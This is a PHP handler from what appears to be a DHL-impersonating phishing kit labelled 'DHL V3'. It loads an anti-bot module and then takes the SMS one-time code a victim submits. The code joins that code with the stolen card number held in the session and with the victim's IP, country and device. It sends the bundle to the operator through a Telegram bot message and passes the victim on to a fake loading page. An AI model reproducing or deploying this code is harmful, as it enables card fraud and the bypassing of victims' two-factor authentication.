<?php

session_start();

include '../../config.php';
include '../../antibots/index.php';

include '../functions.php';
$TIME = date("d/m/Y");
$ip = $_SERVER['REMOTE_ADDR'];
get_user_ipinfo($ip);
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$os_plat = getOS($user_agent);
$browser = getBrowser();


if ($_POST['sim'] != "") {

    $sim_code = $_POST['sim'];



    $Message_SMS = "
    💳 ━━━━━━━━━━━━ 💳
    SMS OTP code: 
    SMS Code: `$sim_code`
    Card:  " . $_SESSION['ccnumber-zbi'] . "
    IP: `$ip`
    IPcountry: $countryy - $country_code
    Time: $TIME
    Device: $os_plat - $browser
    💳 ━━━━━━━━━━━━ 💳
    🃏 DHL V3 by  🃏";

    sendMessage($ChatId, $Message_SMS, $BotToken);


    header('location: ../loading_3.php');
} 

else {
    header('location: ../sms.php');
}


?>